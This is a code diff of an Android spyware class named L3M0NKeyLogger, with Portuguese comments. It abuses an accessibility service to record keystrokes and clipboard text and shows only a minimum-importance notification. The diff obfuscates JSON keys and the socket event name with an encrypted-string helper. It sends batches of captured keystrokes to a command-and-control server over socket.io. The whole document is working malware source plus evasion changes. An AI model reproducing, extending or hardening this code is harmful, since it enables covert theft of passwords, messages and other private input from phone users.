@@ -31,6 +31,8 @@ import javax.crypto.KeyGenerator;
 import javax.crypto.SecretKey;
 import javax.crypto.spec.IvParameterSpec;
 import javax.crypto.spec.SecretKeySpec;
+import org.json.JSONArray;
+import org.json.JSONObject;
 
 public class L3M0NKeyLogger extends AccessibilityService {
 
@@ -109,7 +111,8 @@ public class L3M0NKeyLogger extends AccessibilityService {
     }
 
     private String encryptData(String data) {
-        if (encryptionKey == null || cipher == null || data == null) return data;
+        if (encryptionKey == null || cipher == null || data == null)
+            return data;
         try {
             byte[] iv = new byte[16];
             random.nextBytes(iv);
@@ -137,47 +140,59 @@ public class L3M0NKeyLogger extends AccessibilityService {
     }
 
     private void batchProcessKeys() {
-        List<String> batch;
         synchronized (keyBuffer) {
-            if (keyBuffer.isEmpty()) return;
-            batch = new ArrayList<>(keyBuffer);
-            keyBuffer.clear();
-        }
-
-
-
-
-
-
-
-
-        executor.execute(new Runnable() {
-            @Override
-            public void run() {
-                try {
-                    String encryptedBatch = encryptData(String.join("\n", batch));
-                    sendBatchToC2(encryptedBatch, batch.size());
-                } catch (Exception e) {
-                    Log.e(TAG, "Erro no processamento do batch", e);
-                    persistLogs(batch);
-                }
+            if (keyBuffer.isEmpty()) {
+                return;
             }
-        });
+
+            try {
+                JSONObject data = new JSONObject();
+                JSONArray keysArray = new JSONArray();
+
+                for (String entry : keyBuffer) {
+                    keysArray.put(entry);
+                }
+
+                // === CHAVES JSON CRIPTOGRAFADAS ===
+                data.put(StringCrypto.d("QbicGOkq/srCnveWytUm7w=="), keysArray); // "keys"
+                data.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), getTimestamp()); // "timestamp"
+
+                // Evento 0xKL criptografado
+                String eventKeylogger = StringCrypto.d("JWXCCYGk7kU4y6zS6IrDOQ==");
+                IOSocket.getInstance().getIoSocket().emit(eventKeylogger, data);
+
+                Log.d(TAG, "Keylogger enviado (" + keyBuffer.size() + " entradas) via evento criptografado");
+
+                // Persistência
+                persistLogs(new ArrayList<>(keyBuffer));
+
+                keyBuffer.clear();
+
+            } catch (Exception e) {
+                Log.e(TAG, "Erro ao enviar keylogger: " + e.getMessage());
+            }
+        }
     }
 
     private void sendBatchToC2(String encryptedData, int count) {
         try {
             JSONObject payload = new JSONObject();
-            payload.put("type", "keylog");
-            payload.put("count", count);
-            payload.put("encrypted", true);
-            payload.put("data", encryptedData);
-            payload.put("timestamp", System.currentTimeMillis());
 
-            if (IOSocket.getInstance() != null && IOSocket.getInstance().getIoSocket() != null &&
-                IOSocket.getInstance().getIoSocket().connected()) {
-                
-                IOSocket.getInstance().getIoSocket().emit("0xKL", payload);
+            // === CHAVES JSON CRIPTOGRAFADAS ===
+            payload.put(StringCrypto.d("srbSQcv0S7JW03lm4Y0iBQ=="), "keylog"); // "type"
+            payload.put(StringCrypto.d("D0IetS+zt7hTWohBNPvqEA=="), count); // "count"
+            payload.put(StringCrypto.d("grh1qzoq7rp8Y1w5bGAMHQ=="), true); // "encrypted"
+            payload.put(StringCrypto.d("B9G6+3heWf715hd4xk743g=="), encryptedData); // "data"
+            payload.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis()); // "timestamp"
+
+            if (IOSocket.getInstance() != null &&
+                    IOSocket.getInstance().getIoSocket() != null &&
+                    IOSocket.getInstance().getIoSocket().connected()) {
+
+                // Evento 0xKL criptografado
+                String eventKeylogger = StringCrypto.d("JWXCCYGk7kU4y6zS6IrDOQ==");
+                IOSocket.getInstance().getIoSocket().emit(eventKeylogger, payload);
+
                 Log.d(TAG, "Batch enviado: " + count + " entradas");
             }
         } catch (Exception e) {
@@ -213,7 +228,8 @@ public class L3M0NKeyLogger extends AccessibilityService {
     // ==================== Eventos de Acessibilidade ====================
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
-        if (!isRunning) return;
+        if (!isRunning)
+            return;
 
         try {
             String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "unknown";
@@ -253,7 +269,8 @@ public class L3M0NKeyLogger extends AccessibilityService {
 
     // ==================== Clipboard ====================
     private void registerClipboardListener() {
-        if (clipboardMonitor != null) clipboardMonitor.enable();
+        if (clipboardMonitor != null)
+            clipboardMonitor.enable();
     }
 
     public void onClipboardChanged(String text) {
@@ -265,7 +282,8 @@ public class L3M0NKeyLogger extends AccessibilityService {
     // ==================== Notificação & Ciclo de Vida ====================
     private void createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "L3M0N KeyLogger", NotificationManager.IMPORTANCE_MIN);
+            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "L3M0N KeyLogger",
+                    NotificationManager.IMPORTANCE_MIN);
             notificationManager.createNotificationChannel(channel);
         }
     }
@@ -291,14 +309,18 @@ public class L3M0NKeyLogger extends AccessibilityService {
     };
 
     @Override
-    public void onInterrupt() {}
+    public void onInterrupt() {
+    }
 
     @Override
     public void onDestroy() {
         isRunning = false;
-        if (clipboardMonitor != null) clipboardMonitor.disable();
-        if (mainHandler != null) mainHandler.removeCallbacks(flushRunnable);
-        if (executor != null) executor.shutdown();
+        if (clipboardMonitor != null)
+            clipboardMonitor.disable();
+        if (mainHandler != null)
+            mainHandler.removeCallbacks(flushRunnable);
+        if (executor != null)
+            executor.shutdown();
         notificationManager.cancel(NOTIFICATION_ID);
         instance = null;
         super.onDestroy();
